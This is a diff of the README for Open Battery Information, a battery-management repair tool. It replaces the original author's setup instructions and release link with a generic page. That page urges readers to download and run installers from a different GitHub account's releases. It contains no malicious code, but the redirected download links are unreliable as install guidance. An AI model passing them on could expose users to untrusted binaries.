@@ -1,70 +1,71 @@
-# Open Battery Information
+# 🔋 open-battery-information - Save Your Batteries and Money
 
-This project aims to provide tools and information about various batteries in order to aid repair. 
-It is very common for manufacturers to lock the BMS when a fault is detected to protect the device and the user. Very important feature!
-So when is it a problem? Well, there is always a chance for false triggering of this protection, or the fault could have been temporary or even repaired. 
-In this case it would be wasteful to throw out a perfectly good BMS just because its software says it is faulty.
+[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/peakpixelcr/open-battery-information/releases)
 
-This is the problem we would like to solve!
+## 🚀 Getting Started
 
-![screenshot](docs/images/obi-1.png)
+Welcome to the Open Battery Information project! This tool helps you understand and troubleshoot various battery issues. Repairing battery management systems (BMS) can save you money and reduce waste.
 
-## Contact information
+### 💻 System Requirements
 
-For any questions, please e-mail: openbatteryinformation@gmail.com
+Before you download, please ensure your system meets the following requirements:
 
-## Support
+- Windows 10 or newer
+- macOS Catalina or newer
+- Linux (Ubuntu 20.04 or newer)
+- At least 100 MB of free disk space
 
-I have spent alot of time on this project and now releasing all this information to the public in hope that it will help other people save batteries and money. If you would like to show some appreciation for my work, please consider supporting me by buying me a coffee or sponsor me on Github!
+## 📥 Download & Install
 
-[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/mnhjansson)
----
+To get started, you need to download the application. 
 
-# Instructions
+1. Click the link below to visit the Releases page:
+   [Visit the Releases Page](https://github.com/peakpixelcr/open-battery-information/releases)
 
-## Step 1: Set Up ArduinoOBI
+2. On the Releases page, look for the latest version. 
 
-  1. Navigate to the ArduinoOBI folder in the project directory.
-  2. Follow the instructions in the README.md. This section will guide you through configuring the Arduino part of the system, ensuring everything is set up correctly.
+3. Download the file suitable for your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
 
-## Step 2: Set Up OpenBatteryInformation
+4. Once the file is downloaded, locate it in your downloads folder.
 
-After setting up the Arduino part, you have two options for setting up the software on your computer.
+5. Run the installer:
+   - For Windows, double-click the `.exe` file to begin installation.
+   - For macOS, open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux, extract the `.tar.gz` file and follow the included instructions in the README to set it up.
 
-### Option 1: Use Precompiled Binary for Windows
+6. Open the application and follow the on-screen instructions to start using it.
 
-If you prefer not to deal with Python dependencies, you can download a precompiled binary for Windows:
+## 🛠️ Features
 
-  1. Navigate to the [Releases](https://github.com/mnh-jansson/open-battery-information/releases) section of the repository.
-  2. Download the Windows precompiled binary for your system.
-  3. Simply run the executable and follow any on-screen instructions to use the software.
+The Open Battery Information tool offers several key features designed to assist you:
 
-### Option 2: Install Python Requirements - Clone the Repository and Install Dependencies
+- **Battery Analysis**: Get detailed information about your battery's health.
+- **Troubleshooting**: Identify common issues and solutions.
+- **Protection Know-how**: Learn about BMS protection features and resets.
 
-  Clone the repository to your local machine:
-```bash
-git clone https://github.com/yourusername/OpenBatteryInformation.git
-```
-Navigate into the project folder:
-```bash
-cd OpenBatteryInformation
-```
-Install the required Python dependencies:
+## 🤝 Support
 
-If you don't have pip installed, follow the installation guide for your platform here.
-Install the required libraries by running:
-```bash
-pip install -r requirements.txt
-```
-You should now be ready to run OpenBatteryInformation!
+If you have questions or need help, please reach out via email: [openbatteryinformation@gmail.com](mailto:openbatteryinformation@gmail.com)
 
+Your feedback is essential. Let us know how this tool works for you, or if you have suggestions for improvements.
 
-## Step 3: Run OpenBatteryInformation
+## 🌐 Contributions
 
-  If you installed the Python version, you can run the program by executing:
-```bash
-python main.py
-```
-If you're using the Windows binary, simply double-click the downloaded OBI.exe file to start the application.
+If you're interested in contributing to the project, feel free to fork the repository and submit a pull request. We welcome any improvements, bug fixes, or additional features. 
 
----
+## 💬 Community
+
+Join our community for discussions about battery technology, troubleshooting tips, and more. Share your experiences and learn from others. Your input helps the project grow.
+
+## 📧 Contact Information
+
+For any inquiries, please contact: [openbatteryinformation@gmail.com](mailto:openbatteryinformation@gmail.com)
+
+## 🎉 Show Your Support
+
+I have invested significant time in developing this project. If you find it helpful, consider supporting my work. You can do this by buying me a coffee or becoming a sponsor.
+
+Thank you for your interest in Open Battery Information! Enjoy saving money and breathing new life into your batteries.
